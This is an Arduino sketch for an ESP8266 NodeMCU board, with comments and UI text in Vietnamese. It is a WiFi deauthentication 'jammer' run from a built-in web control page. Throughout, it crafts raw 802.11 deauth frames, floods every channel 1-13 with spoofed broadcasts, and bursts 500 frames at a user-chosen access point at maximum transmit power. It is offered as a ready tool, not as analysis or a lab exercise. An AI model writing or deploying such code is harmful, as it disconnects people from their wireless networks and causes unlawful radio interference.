// zenitdev_jammer_maxpower.ino
// NodeMCU U3 - Phá sóng mạnh tối đa
// Board: Generic ESP8266 Module, 115200, 80MHz

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <user_interface.h>

#define WIFI_SSID "ZenitDev_Control"
#define WIFI_PASS "12345678"
#define WEB_PORT 80

struct {
    bool jamming;
    uint32_t deauth_count;
    uint8_t target_bssid[6];
    char last_action[64];
} state = {false, 0, {0,0,0,0,0,0}, "Cho"};

ESP8266WebServer server(WEB_PORT);

// ============ TX POWER TOI DA ============
void set_max_power() {
    wifi_set_tx_power(82);
}

// ============ DEAUTH FRAME ============
void send_deauth_burst(uint8_t channel, uint8_t *bssid, uint8_t *client) {
    wifi_set_channel(channel);
    delayMicroseconds(100);
    
    uint8_t packet[26];
    packet[0] = 0xc0;
    packet[1] = 0x00;
    packet[2] = 0x3a;
    packet[3] = 0x01;
    
    memcpy(packet + 4, client, 6);
    memcpy(packet + 10, bssid, 6);
    memcpy(packet + 16, bssid, 6);
    packet[22] = 0x00;
    packet[23] = 0x00;
    packet[24] = 0x04;
    packet[25] = 0x00;
    
    for (int i = 0; i < 10; i++) {
        wifi_send_pkt_freedom(packet, 26, 0);
        delayMicroseconds(200);
    }
}

// ============ JAM BROADCAST ============
void jam_all_channels_heavy() {
    uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    uint8_t spoof[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
    
    for (uint8_t ch = 1; ch <= 13; ch++) {
        wifi_set_channel(ch);
        delayMicroseconds(50);
        
        for (int i = 0; i < 200; i++) {
            send_deauth_burst(ch, spoof, broadcast);
            state.deauth_count++;
            delayMicroseconds(100);
            yield();
        }
    }
}

// ============ JAM TARGETED ============
void jam_target_heavy(uint8_t channel, uint8_t *bssid) {
    uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    
    wifi_set_channel(channel);
    
    for (int i = 0; i < 500; i++) {
        send_deauth_burst(channel, bssid, broadcast);
        state.deauth_count++;
        delayMicroseconds(50);
        yield();
    }
}

// ============ SCAN ============
void scan_networks() {
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect();
    delay(100);
    WiFi.scanNetworks(true);
}

// ============ WEB UI ============
void handle_root() {
    String html = "";
    html += "<!DOCTYPE html><html><head>";
    html += "<meta charset='UTF-8'>";
    html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
    html += "<title>Zenitdev - Pha Song Manh</title>";
    html += "<style>";
    html += "body{font-family:monospace;background:linear-gradient(135deg,#0a0e27 0%,#16213e 100%);color:#00ff41;padding:20px;}";
    html += ".container{max-width:1000px;margin:0 auto;}";
    html += ".header{text-align:center;border-bottom:2px solid #ff4444;padding-bottom:15px;margin-bottom:30px;}";
    html += ".header h1{font-size:28px;color:#ff4444;text-shadow:0 0 10px #ff4444;}";
    html += ".header p{color:#ffff00;}";
    html += ".panel{background:rgba(26,31,58,0.9);border:2px solid #ff4444;border-radius:5px;padding:20px;margin:15px 0;box-shadow:0 0 30px rgba(255,68,68,0.3);}";
    html += ".panel h2{color:#ff4444;margin-bottom:15px;text-transform:uppercase;border-bottom:2px solid #ff4444;padding-bottom:8px;}";
    html += ".form-group{margin:12px 0;}";
    html += "label{display:block;margin-bottom:5px;font-weight:bold;}";
    html += "input,select{background:rgba(10,14,39,0.95);color:#00ff41;border:2px solid #ff4444;padding:10px;border-radius:3px;font-family:monospace;width:100%;max-width:400px;}";
    html += ".btn{background:#ff4444;color:white;border:none;padding:12px 30px;margin:5px 5px 5px 0;border-radius:3px;cursor:pointer;font-weight:bold;font-size:14px;transition:all 0.3s;}";
    html += ".btn:hover{background:#ff0000;box-shadow:0 0 20px #ff4444;}";
    html += ".btn:active{transform:scale(0.95);}";
    html += ".status-box{background:rgba(255,68,68,0.1);border-left:4px solid #ff4444;padding:15px;margin:15px 0;border-radius:3px;}";
    html += ".status-item{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px dotted #ff4444;}";
    html += ".status-label{color:#ff4444;}";
    html += ".status-value{color:#ffff00;font-weight:bold;font-size:14px;}";
    html += ".network-table{width:100%;border-collapse:collapse;font-size:12px;margin-top:10px;}";
    html += ".network-table th{background:rgba(255,68,68,0.2);color:#ff4444;padding:8px;border-bottom:2px solid #ff4444;}";
    html += ".network-table td{padding:8px;border-bottom:1px solid #ff4444;}";
    html += ".network-table tr:hover{background:rgba(255,68,68,0.1);}";
    html += ".warning{background:rgba(255,68,68,0.2);border:2px solid #ff4444;color:#ffff00;padding:10px;border-radius:3px;margin:10px 0;}";
    html += "</style></head><body>";
    html += "<div class='container'>";
    html += "<div class='header'>";
    html += "<h1>ZENITDEV MAXPOWER</h1>";
    html += "<p>Pha song WiFi 2.4GHz - Toi uu NodeMCU U3</p>";
    html += "<p>Make by NVH</p>";
    html += "</div>";
    html += "<div class='warning'>MODE PHAT MAX: TX Power 82 dBm + Burst 10x Frame</div>";
    
    // SCAN
    html += "<div class='panel'><h2>Quet Mang WiFi</h2>";
    html += "<button class='btn' onclick='scan_networks()'>QUET NGAY</button>";
    html += "<div id='scan_result'></div></div>";
    
    // BROADCAST
    html += "<div class='panel'><h2>Pha Toan Bo (Tat Ca Kenh)</h2>";
    html += "<p style='color:#ffff00;margin:10px 0;'>Jam kenh 1-13 lien tuc, 200 frame/kenh</p>";
    html += "<button class='btn' onclick='jam_broadcast()'>BAT DAU PHAT FULL</button>";
    html += "<button class='btn' onclick='stop_jam()' style='background:#444;'>DUNG</button>";
    html += "<div class='status-box' id='bcast_status'>";
    html += "<div class='status-item'><span class='status-label'>Trang thai:</span><span class='status-value'>Cho</span></div>";
    html += "</div></div>";
    
    // TARGETED
    html += "<div class='panel'><h2>Pha Muc Tieu (500 Frame)</h2>";
    html += "<div class='form-group'><label>BSSID:</label>";
    html += "<input type='text' id='target_bssid' placeholder='AA:BB:CC:DD:EE:FF'></div>";
    html += "<div class='form-group'><label>Kenh:</label>";
    html += "<select id='target_channel'>";
    html += "<option value='1'>1</option><option value='6' selected>6</option><option value='11'>11</option>";
    html += "</select></div>";
    html += "<button class='btn' onclick='jam_target()'>PHAT MUC TIEU</button>";
    html += "<button class='btn' onclick='stop_jam()' style='background:#444;'>DUNG</button>";
    html += "<div class='status-box' id='target_status'>";
    html += "<div class='status-item'><span class='status-label'>Trang thai:</span><span class='status-value'>Cho</span></div>";
    html += "</div></div>";
    
    // STATUS
    html += "<div class='panel'><h2>Thong Ke</h2>";
    html += "<div class='status-box'>";
    html += "<div class='status-item'><span class='status-label'>Frame Deauth Da Gui:</span><span class='status-value' id='deauth_count'>0</span></div>";
    html += "<div class='status-item'><span class='status-label'>Hanh Dong Cuoi:</span><span class='status-value' id='last_action'>Khong co</span></div>";
    html += "<div class='status-item'><span class='status-label'>Trang Thai:</span><span class='status-value' id='jam_status'>Idle</span></div>";
    html += "</div></div>";
    html += "</div>";
    
    html += "<script>";
    html += "function scan_networks(){";
    html += "document.getElementById('scan_result').innerHTML='<p style=\"color:#00ff41;\">Dang quet...</p>';";
    html += "fetch('/api/scan').then(r=>r.json()).then(data=>{";
    html += "let h='<h3>Tim thay '+data.networks.length+' mang:</h3>';";
    html += "h+='<table class=\"network-table\"><tr><th>SSID</th><th>BSSID</th><th>Kenh</th><th>Tin Hieu</th></tr>';";
    html += "data.networks.forEach(n=>{h+='<tr><td>'+n.ssid+'</td><td style=\"font-size:11px;\">'+n.bssid+'</td><td>'+n.channel+'</td><td>'+n.rssi+'</td></tr>';});";
    html += "h+='</table>';";
    html += "document.getElementById('scan_result').innerHTML=h;});}\n";
    
    html += "function jam_broadcast(){";
    html += "document.getElementById('bcast_status').innerHTML='<div class=\"status-item\"><span class=\"status-label\">Trang thai:</span><span class=\"status-value\">DANG PHAT FULL...</span></div>';";
    html += "fetch('/api/jam_broadcast').then(r=>r.json()).then(data=>{";
    html += "document.getElementById('bcast_status').innerHTML='<div class=\"status-item\"><span class=\"status-label\">Trang thai:</span><span class=\"status-value\">HOAN THANH (2600 Frame)</span></div>';";
    html += "document.getElementById('deauth_count').textContent=data.deauth_count;";
    html += "document.getElementById('last_action').textContent='Pha Broadcast - Tat Ca Kenh';});}\n";
    
    html += "function jam_target(){";
    html += "let bssid=document.getElementById('target_bssid').value;";
    html += "if(!bssid){alert('Nhap BSSID');return;}";
    html += "let ch=document.getElementById('target_channel').value;";
    html += "document.getElementById('target_status').innerHTML='<div class=\"status-item\"><span class=\"status-label\">Trang thai:</span><span class=\"status-value\">DANG PHAT MUC TIEU...</span></div>';";
    html += "fetch('/api/jam_target?bssid='+encodeURIComponent(bssid)+'&channel='+ch).then(r=>r.json()).then(data=>{";
    html += "document.getElementById('target_status').innerHTML='<div class=\"status-item\"><span class=\"status-label\">Trang thai:</span><span class=\"status-value\">HOAN THANH (500 Frame)</span></div>';";
    html += "document.getElementById('deauth_count').textContent=data.deauth_count;";
    html += "document.getElementById('last_action').textContent='Pha Muc Tieu: '+bssid;});}\n";
    
    html += "function stop_jam(){";
    html += "fetch('/api/stop').then(r=>r.json()).then(data=>{";
    html += "document.getElementById('bcast_status').innerHTML='<div class=\"status-item\"><span class=\"status-label\">Trang thai:</span><span class=\"status-value\">DA DUNG</span></div>';";
    html += "document.getElementById('target_status').innerHTML='<div class=\"status-item\"><span class=\"status-label\">Trang thai:</span><span class=\"status-value\">DA DUNG</span></div>';});}\n";
    
    html += "setInterval(()=>{fetch('/api/status').then(r=>r.json()).then(data=>{";
    html += "document.getElementById('deauth_count').textContent=data.deauth_count;";
    html += "}).catch(e=>{});},500);";
    html += "</script></body></html>";
    
    server.send(200, "text/html", html);
}

void handle_api_scan() {
    scan_networks();
    delay(3000);
    
    String json = "{\"networks\":[";
    int n = WiFi.scanComplete();
    if (n == -1) n = 0;
    
    for (int i = 0; i < n && i < 30; i++) {
        String ssid = WiFi.SSID(i);
        String bssid = WiFi.BSSIDstr(i);
        int channel = WiFi.channel(i);
        int rssi = WiFi.RSSI(i);
        
        json += "{\"ssid\":\"" + ssid + "\",\"bssid\":\"" + bssid + "\",\"channel\":" + channel + ",\"rssi\":" + rssi + "}";
        if (i < n-1) json += ",";
    }
    
    json += "]}";
    server.send(200, "application/json", json);
}

void handle_api_jam_broadcast() {
    state.jamming = true;
    jam_all_channels_heavy();
    state.jamming = false;
    strcpy(state.last_action, "Pha Broadcast");
    
    String response = "{\"status\":\"Hoan\",\"deauth_count\":" + String(state.deauth_count) + "}";
    server.send(200, "application/json", response);
}

void handle_api_jam_target() {
    String bssid_str = server.arg("bssid");
    uint8_t ch = server.arg("channel").toInt();
    
    uint8_t bssid[6];
    sscanf(bssid_str.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
        &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
    
    state.jamming = true;
    jam_target_heavy(ch, bssid);
    state.jamming = false;
    strcpy(state.last_action, "Pha Muc Tieu");
    
    String response = "{\"status\":\"Hoan\",\"deauth_count\":" + String(state.deauth_count) + "}";
    server.send(200, "application/json", response);
}

void handle_api_stop() {
    state.jamming = false;
    String response = "{\"status\":\"Stop\",\"deauth_count\":" + String(state.deauth_count) + "}";
    server.send(200, "application/json", response);
}

void handle_api_status() {
    String response = "{\"jamming\":" + String(state.jamming ? "true" : "false") + ",\"deauth_count\":" + String(state.deauth_count) + "}";
    server.send(200, "application/json", response);
}

// ============ SETUP ============
void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n[ZENITDEV MAXPOWER] Init");
    
    WiFi.mode(WIFI_OFF);
    delay(100);
    
    set_max_power();
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP(WIFI_SSID, WIFI_PASS);
    
    IPAddress local_ip(192, 168, 4, 1);
    IPAddress gateway(192, 168, 4, 1);
    IPAddress subnet(255, 255, 255, 0);
    WiFi.softAPConfig(local_ip, gateway, subnet);
    
    Serial.println("[ZENITDEV] AP Ready");
    Serial.print("[ZENITDEV] SSID: ");
    Serial.println(WIFI_SSID);
    
    server.on("/", handle_root);
    server.on("/api/scan", handle_api_scan);
    server.on("/api/jam_broadcast", handle_api_jam_broadcast);
    server.on("/api/jam_target", handle_api_jam_target);
    server.on("/api/stop", handle_api_stop);
    server.on("/api/status", handle_api_status);
    
    server.begin();
    Serial.println("[ZENITDEV] Web live - 192.168.4.1");
}

void loop() {
    server.handleClient();
    delay(5);
}
